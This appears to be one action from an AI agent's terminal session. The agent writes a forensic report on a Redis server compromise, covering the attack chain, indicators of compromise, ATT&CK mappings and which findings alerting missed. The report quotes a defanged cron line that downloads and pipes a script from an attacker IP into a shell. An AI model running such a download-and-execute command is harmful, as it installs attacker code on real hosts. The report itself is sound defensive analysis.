Sending keys: ["cat << 'EOF' > /app/intrusion-report.md\n# Post-Compromise Intrusion Forensic Report\n\n## 1. Executive Summary\nOn host `redis-prod-01`, an external threat actor exploited an unauthenticated Redis instance exposed to the public internet (`0.0.0.0:6379`). The threat actor used administrative Redis commands (`CONFIG SET` / module commands) to achieve remote execution as root, deploy a cryptocurrency miner, establish cron persistence, and install a silent userland rootkit via `LD_PRELOAD` dynamic linker hijacking.\n\nWhile security alerts (`/sas/alerts.json:2`) captured the miner binary and the root cron modification, several critical persistence and stealth components were completely omitted from endpoint alerting and required forensic disk analysis (`/disk/etc/ld.so.preload:1`, `/disk/tmp/.redis/exp.so:1`, `/disk/var/lib/.cache/.wiped.bin:1`).\n\n## 2. Threat Actor Entities & Indicators of Compromise (IOCs)\n- **Originating Attacker IP**: `198.51.100.170` (`/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, `/disk/var/spool/cron/crontabs/root:5`)\n- **Command and Control Domain (C2)**: `update-redis.example.cn` (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:1`)\n- **Cryptomining Pool**: `stratum+tcp://xmr.redis.evil:3333` (`/sas/cti/advisory.txt:23`, `/disk/tmp/.redis/kdevtmpfsi:2`, `/disk/tmp/.redis/exp.so:3`)\n- **Monero Wallet Address**: `4A00000000000000000031c7d95fb9f3` (`/sas/cti/advisory.txt:24`, `/disk/tmp/.redis/kdevtmpfsi:3`, `/disk/tmp/.redis/exp.so:4`)\n- **Payload Drop Location**: `/tmp/.redis/` (`/disk/tmp/.redis/kdevtmpfsi:1`, `/disk/tmp/.redis/exp.so:1`)\n\n## 3. Attack Chain & Technical Analysis\n\n### Step 1: Initial Access (ATT&CK T1133 - External Remote Services)\nThe host ran Redis bound to all network interfaces (`0.0.0.0`) with `protected-mode` disabled and no password authentication configured (`/disk/etc/redis/redis.conf:3`). An external attacker connected directly to TCP port 6379 from IP `198.51.100.170` (`/sas/cti/advisory.txt:6`).\n\n### Step 2: Execution (ATT&CK T1059.004 - Unix Shell)\nThe attacker utilized Redis `CONFIG SET` commands to write malicious files directly to the host filesystem, as well as staging exploit module binaries (`/disk/tmp/.redis/exp.so:1`, `/sas/cti/advisory.txt:13`).\n\n### Step 3: Impact / Resource Hijacking (ATT&CK T1496 - Resource Hijacking)\nThe attacker dropped and executed `kdevtmpfsi` (XMRig family miner process) under `/tmp/.redis/kdevtmpfsi` (`/disk/tmp/.redis/kdevtmpfsi:1`, `/sas/alerts.json:2`). The process connected to mining pool `stratum+tcp://xmr.redis.evil:3333` causing sustained high CPU consumption.\n\n### Step 4: Persistence (ATT&CK T1053.003 - Cron)\nPersistence was established by writing a root cron job into `/var/spool/cron/crontabs/root` (`/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`). The cron entry executes `curl hxxp://198.51.100.170/x | sh` to periodically re-download and maintain the mining payload.\n\n### Step 5: Evasion / Stealth (ATT&CK T1574.006 - Dynamic Linker Hijacking)\nTo hide processes and avoid detection by system tools, the attacker modified `/etc/ld.so.preload` (`/disk/etc/ld.so.preload:1`) to preload `/lib/.hide.so`, a userland shared library rootkit. This mechanism was **silent** and not captured in `/sas/alerts.json`.\n\n## 4. Alerted vs. Silent Evidence Breakdown\n\n| Artifact / Finding | File Path | ATT&CK Technique | Alert Feed Status | Evidence Citation |\n|-------------------|-----------|------------------|-------------------|-------------------|\n| Miner Process | `/tmp/.redis/kdevtmpfsi` | T1496 | Alerted (`ALERT-01`) | `/disk/tmp/.redis/kdevtmpfsi:1` / `/sas/alerts.json:2` |\n| Cron Persistence | `/var/spool/cron/crontabs/root` | T1053.003 | Alerted (`ALERT-02`) | `/disk/var/spool/cron/crontabs/root:5` / `/sas/alerts.json:10` |\n| Weak Redis Config | `/etc/redis/redis.conf` | T1133 | Alerted (`ALERT-03`) | `/disk/etc/redis/redis.conf:3` / `/sas/baseline.json:1` |\n| Dynamic Linker Preload Hook | `/etc/ld.so.preload` | T1574.006 | **SILENT** (Missed by SAS) | `/disk/etc/ld.so.preload:1` |\n| Staged Exploit / Module Sample | `/tmp/.redis/exp.so` | T1059.004 | **SILENT** (Missed by SAS) | `/disk/tmp/.redis/exp.so:1` |\n| Wiped Binary / Beacon Record | `/var/lib/.cache/.wiped.bin` | T1071.001 / T1070.004 | **SILENT** (Missed by SAS) | `/disk/var/lib/.cache/.wiped.bin:1` |\n\nEOF\n"] min_timeout_sec: 0.2 max_timeout_sec: 180.0
